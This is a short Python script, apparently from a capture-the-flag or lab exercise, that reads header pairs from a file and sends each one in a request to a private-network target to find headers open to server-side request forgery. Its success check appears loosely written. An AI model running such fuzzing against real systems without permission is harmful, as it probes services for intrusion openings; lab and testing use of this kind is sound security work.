import requests

url = "http://10.10.120.144:1337/"
headers = {
    "User-Agent": "SSRF-fuzz"
}

with open("headers.txt") as f:
    for line in f:
        key, value = line.strip().split(": ")
        test_headers = headers.copy()
        test_headers[key] = value
        r = requests.get(url, headers=test_headers)
        if "EXPOSED" not in r.text or r.status_code != 200:
            print(f"[!] Possible SSRF header: {key}")
            print(f"    Response len: {len(r.text)} | Status: {r.status_code}")
